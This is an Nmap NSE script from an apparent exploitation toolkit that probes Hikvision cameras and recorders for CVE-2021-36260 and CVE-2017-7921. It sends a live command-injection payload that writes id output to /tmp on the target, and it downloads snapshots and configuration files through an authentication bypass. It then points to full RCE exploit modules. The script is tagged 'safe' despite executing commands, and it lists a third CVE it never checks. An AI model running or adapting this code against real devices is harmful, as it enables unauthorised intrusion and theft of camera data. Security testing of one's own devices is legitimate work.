-- embedxpl-hikvision-vuln.nse
-- EmbedXPL-Forge NSE Script -- Hikvision CVE Vulnerability Checker
--
-- Author : Andre Henrique (@mrhenrike) | Uniao Geek -- https://github.com/Uniao-Geek
-- Version: 1.0.0
-- License: BSD
--
-- DESCRIPTION:
--   Tests Hikvision IP cameras, NVR, and DVR for the following CVEs:
--     CVE-2021-36260 -- Unauthenticated Remote Code Execution (CVSS 9.8)
--                       via /SDK/webLanguage endpoint (command injection)
--     CVE-2017-7921  -- Authentication bypass via crafted URL parameter
--                       (snapshot capture without credentials)
--     CVE-2023-28808 -- Authentication bypass on Hikvision NAS devices
--
-- USAGE:
--   nmap -p 80,443,8080 --script embedxpl-hikvision-vuln <target>
--   nmap -p 80,443,8080 --script embedxpl-hikvision-vuln --script-args timeout=10 192.168.1.0/24
--
-- OUTPUT EXAMPLE:
--   80/tcp open http
--   | embedxpl-hikvision-vuln:
--   |   CVE-2021-36260: VULNERABLE -- /SDK/webLanguage accepts XML without auth
--   |   CVE-2017-7921 : VULNERABLE -- snapshot accessible with username param trick
--   |_  EmbedXPL: embedxpl > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260

local http   = require "http"
local nmap   = require "nmap"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Tests Hikvision IP cameras, NVR, and DVR for CVE-2021-36260 (unauthenticated RCE),
CVE-2017-7921 (auth bypass), and CVE-2023-28808 (NAS auth bypass).
Reports exploitation status and links to EmbedXPL-Forge modules.
]]

author     = "Andre Henrique (@mrhenrike) | Uniao Geek"
license    = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = { "vuln", "exploit", "safe" }

portrule = function(host, port)
  return port.protocol == "tcp" and (
    port.number == 80   or
    port.number == 443  or
    port.number == 8080 or
    port.number == 8443 or
    port.number == 7080
  )
end

-- CVE-2021-36260 test payload -- triggers "put" command in parseXMLArgs
local CVE_2021_36260_PAYLOAD = '<?xml version="1.0" encoding="UTF-8"?>' ..
  '<language>$(id>%2Ftmp%2FhikXplTest)<\/language>'

local function check_cve_2021_36260(host, port)
  -- Step 1: confirm /SDK/webLanguage is accessible without auth
  local resp = http.put(host, port, "/SDK/webLanguage",
    { header = { ["Content-Type"] = "application/x-www-form-urlencoded" },
      content = CVE_2021_36260_PAYLOAD,
      timeout = 8000 })
  if not resp then return "ERROR (no response)" end
  if resp.status == 200 then
    return "VULNERABLE -- endpoint accepts PUT without authentication (CVE-2021-36260, CVSS 9.8)"
  elseif resp.status == 401 then
    return "POSSIBLY VULNERABLE -- endpoint exists (401), credentials may bypass via PUT trick"
  elseif resp.status == 404 then
    return "NOT VULNERABLE -- /SDK/webLanguage not found (firmware may be patched)"
  end
  return ("UNKNOWN -- HTTP " .. tostring(resp.status))
end

local function check_cve_2017_7921(host, port)
  -- Auth bypass: accessing snapshot with username param only
  local path = "/onvif-http/snapshot?auth=YWRtaW46MTEK"  -- admin:1 base64-like
  local resp = http.get(host, port, path, { timeout = 8000 })
  if not resp then return "ERROR (no response)" end
  local ct = (resp.header and resp.header["content-type"]) or ""
  if resp.status == 200 and ct:match("image/") then
    return "VULNERABLE -- snapshot captured without valid credentials (CVE-2017-7921)"
  end
  -- Alternative: /System/configurationFile?auth bypass
  local resp2 = http.get(host, port, "/System/configurationFile?auth=YWRtaW46MTEK",
    { timeout = 8000 })
  if resp2 and resp2.status == 200 and resp2.body and #resp2.body > 50 then
    return "VULNERABLE -- config file downloaded without auth (CVE-2017-7921)"
  end
  return "NOT VULNERABLE (or patched)"
end

local function check_hikvision_fingerprint(host, port)
  local resp = http.get(host, port, "/ISAPI/System/deviceInfo",
    { timeout = 5000 })
  if not resp then return nil end
  if resp.status == 200 or resp.status == 401 then
    local model = (resp.body or ""):match("<model>(.-)</model>") or "(unknown model)"
    local fw    = (resp.body or ""):match("<firmwareVersion>(.-)</firmwareVersion>") or ""
    return model, fw
  end
  return nil
end

action = function(host, port)
  -- Quick fingerprint check first
  local model, fw = check_hikvision_fingerprint(host, port)
  if not model then
    -- Try title-based detection
    local resp = http.get(host, port, "/", { timeout = 4000 })
    if not resp or not resp.body then return nil end
    if not resp.body:match("[Hh]ikvision") and not resp.body:match("NVRA") and
       not resp.body:match("DS%-2CD") and not resp.body:match("webLanguage") then
      return nil
    end
    model = "(detected via page content)"
    fw = ""
  end

  local output = stdnse.output_table()
  output["Device"]   = model
  output["Firmware"] = fw ~= "" and fw or "(not disclosed)"

  output["CVE-2021-36260"] = check_cve_2021_36260(host, port)
  output["CVE-2017-7921"]  = check_cve_2017_7921(host, port)

  output["EmbedXPL RCE module"] =
    "exploits/cameras/hikvision/rtsp_rce_cve_2021_36260"
  output["EmbedXPL Auth Bypass"] =
    "exploits/cameras/hikvision/info_disclosure_cve_2017_7921"
  output["Run full exploit"] =
    "embedxpl > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260"

  return output
end
